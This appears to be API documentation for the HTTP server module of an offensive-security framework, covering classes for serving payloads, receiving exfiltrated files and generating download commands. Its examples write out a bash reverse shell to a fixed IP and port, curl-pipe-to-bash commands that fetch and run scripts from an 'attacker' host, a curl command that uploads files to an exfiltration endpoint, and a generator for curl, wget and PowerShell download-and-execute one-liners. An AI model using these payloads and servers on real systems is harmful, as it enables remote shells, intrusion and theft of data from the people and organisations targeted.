# HTTP Server API

HTTP server utilities for data exfiltration and payload delivery.

## Module: `ofx.api.httpserver`

Provides HTTP server functionality for offensive operations.

## Classes

### SimpleHTTPServer

Basic HTTP server for file serving and data collection.

```python
from ofx.api.httpserver import SimpleHTTPServer

# Start server
server = SimpleHTTPServer(port=8000, directory="/path/to/files")
server.start()

# Server running at http://0.0.0.0:8000
# Serves files from directory
```

**Parameters**:
- `port` (int): Server port (default: 8000)
- `directory` (str): Directory to serve (default: current directory)  
- `host` (str): Bind address (default: 0.0.0.0)
- `allow_upload` (bool): Enable file uploads (default: False)

**Methods**:
- `start()` - Start server (non-blocking)
- `stop()` - Stop server
- `get_logs()` - Get access logs

### PayloadServer

HTTP server for payload delivery with logging.

```python
from ofx.api.httpserver import PayloadServer

# Setup payload server
server = PayloadServer(port=8080)

# Add payloads
server.add_payload("/shell.sh", content=shell_script)
server.add_payload("/exploit.py", file="/path/to/exploit.py")

# Start serving
server.start()

# Track downloads
hits = server.get_hits("/shell.sh")
```

**Methods**:
- `add_payload(path, content=None, file=None)` - Add payload
- `remove_payload(path)` - Remove payload
- `get_hits(path)` - Get download count
- `start()` - Start server
- `stop()` - Stop server

### ExfilServer

HTTP server for data exfiltration.

```python
from ofx.api.httpserver import ExfilServer

# Start exfil server
server = ExfilServer(port=9000, save_dir="/exfil/data")
server.start()

# On target, send data:
# curl -X POST http://attacker:9000/upload \
#   -F "file=@sensitive.txt"

# Retrieve exfiltrated data
files = server.get_files()
```

**Parameters**:
- `port` (int): Server port
- `save_dir` (str): Directory to save received files
- `auto_timestamp` (bool): Add timestamps to filenames

**Methods**:
- `get_files()` - List received files
- `get_file_content(filename)` - Read file content
- `clear_files()` - Delete all files

## Functions

### start_server

Quick server creation.

```python
from ofx.api.httpserver import start_server

# Serve current directory
server = start_server(port=8000)

# With uploads enabled  
server = start_server(port=8000, allow_upload=True)

# Custom directory
server = start_server(port=8080, directory="/payloads")
```

### create_oneliner

Generate one-liner download commands.

```python
from ofx.api.httpserver import create_oneliner

# Generate curl command
cmd = create_oneliner(
    url="http://192.168.1.100:8000/shell.sh",
    method="curl"
)
# Returns: "curl -s http://192.168.1.100:8000/shell.sh | bash"

# wget version
cmd = create_oneliner(url=url, method="wget")

# PowerShell version
cmd = create_oneliner(url=url, method="powershell")
```

## Examples

### Payload Delivery

```python
from ofx.api.httpserver import PayloadServer

# Setup server
server = PayloadServer(port=8080)

# Add reverse shell payload
reverse_shell = '''#!/bin/bash
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
'''
server.add_payload("/shell.sh", content=reverse_shell)

# Start server
server.start()
print("Payload available at: http://0.0.0.0:8080/shell.sh")

# On target: 
# curl http://attacker:8080/shell.sh | bash
```

### Data Exfiltration

```python
from ofx.api.httpserver import ExfilServer
import time

# Start exfil server
server = ExfilServer(port=9000, save_dir="/tmp/exfil")
server.start()

print("Exfil server running on port 9000")
print("Send data with:")
print("  curl -F file=@data.txt http://attacker:9000/upload")

# Wait for files
time.sleep(300)

# Check received files
files = server.get_files()
for f in files:
    content = server.get_file_content(f)
    print(f"Received {f}: {len(content)} bytes")
```

### File Server with Logging

```python
from ofx.api.httpserver import SimpleHTTPServer

# Serve payloads directory
server = SimpleHTTPServer(
    port=8000,
    directory="/opt/payloads",
    allow_upload=False
)

server.start()

# Monitor access
while True:
    logs = server.get_logs()
    for log in logs:
        print(f"{log['timestamp']}: {log['ip']} accessed {log['path']}")
    time.sleep(10)
```

## Security Considerations

- Bind to specific interface in production
- Use authentication for sensitive operations
- Enable HTTPS for credential transmission
- Rate limit to prevent abuse
- Log all access for monitoring

## See Also

- [HTTP API](../exploitation/http.md)
- [File API](file.md)
- [Post-Exploitation Overview](index.md)
